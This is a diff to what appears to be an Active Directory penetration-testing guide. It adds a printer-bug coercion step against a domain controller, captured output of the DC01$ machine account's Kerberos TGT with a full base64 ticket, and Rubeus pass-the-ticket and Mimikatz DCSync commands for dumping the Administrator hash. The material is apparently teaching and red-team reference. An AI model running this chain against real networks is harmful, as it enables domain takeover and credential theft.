@@ -281,11 +281,37 @@ With the printer bug we can force the Domain Controller to connect to any server
 .\MS-RPRN.exe \\dc01.corp.local \\udeleg.corp.local
 ```
 
+On the listener we will receive a Ticket TGT from the DC machine account `DC01$`:
+
+```
+[*] 6/10/2022 4:29:53 PM UTC - Found new TGT:
+
+  User                  :  DC01$@CORP.LOCAL
+  StartTime             :  6/10/2022 6:32:58 AM
+  EndTime               :  6/10/2022 4:32:57 PM
+  RenewTill             :  6/16/2022 9:01:51 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgzdiOtwS+cAcLOZJMO+dPDVk+nVz8Gl6X7LNl+FVx8GU29naNwzNLEm6+GtbrKbuu+5/cmP3SPGeRZZPcggT7rM9aYzrIpn2xZadXN5SviKI47opFETnalXeuoIco/LjoYVzAsAjFrpZ0cXUgVXMJyT/X2YL0qDAQHNArzenfXiMd+Yzy2xPdjiPteusMzbkWx7gz92mWtV+JFHSocAsbVCTtkl8BXVuT67I55U9tGit5+TAtfg+CfBUZlLNfZaMtPjDs8hyinR2qyo2/NaiROyzyUFUhOZaHjhdX9G3zFDKvCPVXx0aiWPmHotGfR2HhAjy281DqX57xpA4vl/TvksgYj0nTz1S3JLhZyKfJfJbpoLDXLsNipSN6lypcxGdKwTyGQrxKT+ftDlI1ui08WBR1YSDCJCRa6u5JczvHO2bHLOTxn7Dpi7TUrBNVyxs5fYXaBA4nMf1J8luJQRp22bTBpXrgH8zd9cNTmTb/9q0bNCiWV16cEYnDTWxua7APwY4qSwVZWA//6ZSbwChQAq2g7m6tDls9v60oiMZRx957xAFeOfhoL1eEcEcO8z7CL9c4KpZBteWSNWuk/4kHCFREHDFGKRPtWV4kPMEty9d9Mk28xwj3njdoNVQvo1K7JZHNamZukSH2oty3uX6cvWe4T/gT6dEz1dzr0ENsWCwtTEGumxligGyWTcxyJdFj4Aul6aeRumiewJvS6GRZxlqln7gCL3Rw4NlN6vMMzSJsvpW/KbS1wtJlP5FgpUYmfZupMx1R3hEKoVpDiAOX0HqK7/tXmn/+zMJeajLscOCll6FCPP/lysRwn6HHSNjD8rjh3Ylw9hqpZv/Aqm+nvc9SUkkOqsJH2XfI3TmxmzViweZ/vdyK/HeTwfaEsTpyFtarsz8uutVSyK9VzepzU/PoTOc/SmpHo1BUhvsCUQjA0njFslQ0loLJydoXkXaWRcfbGWET/jQa3cNHPoK3jg5VY4njENzp7D59Nt7a/s2Lrj8xe3365z7YDOFxIaTUQGWUC0qr9XOQ+EDDc80/CcYyDrUN79Z7wqbbl/7BkzTtqd1wbVgSYTVhiWmnLALvBBXcPqazZv7DN8FlfDwDau6plwiKZlSjKJN7ecJwgy5xf5HixsuLO9Sm+bfjuElCjhVvklyrt6oZ/G7vm+KqhJA7SAk/9fnHlWbV4Eon8XPqt/pirKgdP/Rv6dPECw7ybwTpytHJh1Wqp7456opEFZGYq8mOWCFsirMRU+G7EWNUVr3AxN1sbcwFUdb4mVql4onFCMgRIv6F4UkCKRNej5lG6SLfRCCxg85dytrWVRYs7GO8I968dFtoxAI/a4WjjPeA0y1J1zrc5aMeYhOD5XHx4XMkz7+Kd0FLNSmreNhQsHtkx4WIaqTg6/0qIgvlo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAfSXFmixqxdagZDdk9m0Rp5BX7xWnwbLflr8znMe5aCqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDYxMDEzMzI1OFqmERgPMjAyMjA2MTAyMzMyNTdapxEYDzIwMjIwNjE3MDQwMTUxWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
+
+```
+
+Finally we can import it with Rubeus, execute a Pass-The-Ticket and do a DCSync Attack to retrieve Administrator NTLM hash.
+
+```powershell
+.\Rubeus.exe ptt /ticket:<b64ticket>
+```
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
+```
+
 ## Constrained Delegation
 
 When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user.
 
-A typical scenario where constrained delegation is userd is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
+A typical scenario where constrained delegation is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
 
 > **Note**: Allows the first hop server to request access only to **specified services** on **specified computers**. 
 
